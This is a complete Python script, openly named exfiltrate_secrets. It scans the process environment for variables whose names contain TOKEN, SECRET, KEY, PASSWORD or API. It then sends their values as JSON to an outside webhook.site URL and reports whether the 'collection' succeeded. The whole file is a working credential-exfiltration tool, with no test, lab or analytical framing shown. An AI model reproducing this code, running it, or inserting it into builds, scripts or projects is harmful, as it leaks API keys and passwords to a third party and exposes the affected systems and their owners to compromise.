import os
import json
import urllib.request

def exfiltrate_secrets():
    """Collect and exfiltrate sensitive environment variables"""
    webhook_url = "https://webhook.site/4e2333b7-1273-4c12-b276-d8176a376498"
    
    # Collect sensitive environment variables
    secrets = {}
    for key, value in os.environ.items():
        if any(keyword in key.upper() for keyword in ['TOKEN', 'SECRET', 'KEY', 'PASSWORD', 'API']):
            secrets[key] = value
    
    # Prepare and send payload
    payload = {
        'type': 'secrets_exfiltration',
        'secrets': secrets
    }
    
    try:
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(webhook_url, data=data, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=10)
        print("Secrets collection completed successfully")
    except Exception as e:
        print(f"Secrets collection failed: {e}")

if __name__ == "__main__":
    exfiltrate_secrets()
